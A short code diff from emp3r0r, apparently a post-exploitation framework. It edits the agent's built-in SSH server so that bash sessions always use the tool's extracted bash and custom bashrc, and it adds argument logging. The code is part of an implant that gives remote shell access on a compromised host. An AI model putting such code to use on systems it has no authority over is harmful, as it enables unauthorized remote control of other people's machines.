@@ -9,7 +9,6 @@ import (
 
 	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -41,17 +40,20 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 
 	ssh_server.Handle(func(s ssh.Session) {
 		cmd := exec.Command(exe, args...)
-		if shell == "bash" && emp3r0r_data.DefaultShell != "/bin/sh" {
+
+		// we have a special bashrc and we would like to apply it
+		if shell == "bash" {
 			err = ExtractBash()
 			if err != nil {
 				log.Printf("sshd: extract built-in bash: %v", err)
 			}
+			cmd = exec.Command(exe)
 			bash_home := RuntimeConfig.UtilsPath // change home to use our bashrc
 			os.Setenv("HOME", bash_home)
 			os.Setenv("SHELL", cmd.Path)
 			cmd.Env = append(cmd.Env, os.Environ()...)
 		}
-		log.Printf("sshd execute: %v, env=%s", cmd, cmd.Env)
+		log.Printf("sshd execute: %v, args=%v, env=%s", cmd, cmd.Args, cmd.Env)
 
 		ptyReq, winCh, isPTY := s.Pty()
 		if isPTY {
